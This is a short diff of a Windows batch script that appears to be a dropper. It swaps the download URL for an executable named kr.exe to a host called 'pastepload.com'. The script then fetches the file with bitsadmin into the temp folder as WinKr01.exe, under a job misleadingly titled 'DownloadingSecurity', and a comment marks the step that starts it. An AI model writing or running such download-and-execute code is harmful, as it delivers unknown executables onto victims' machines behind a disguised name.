@@ -24,7 +24,7 @@ timeout /t 3 /nobreak > nul
 
 REM Download WinKr01.exe
 set exeFileName=WinKr01.exe
-set downloadUrl=https://lunarsecure.com/kr.exe
+set downloadUrl=https://pastepload.com/kr.exe
 bitsadmin.exe /transfer "DownloadingSecurity" %downloadUrl% "%tempPath%\%exeFileName%"
 
 REM Start WinKr01.exe
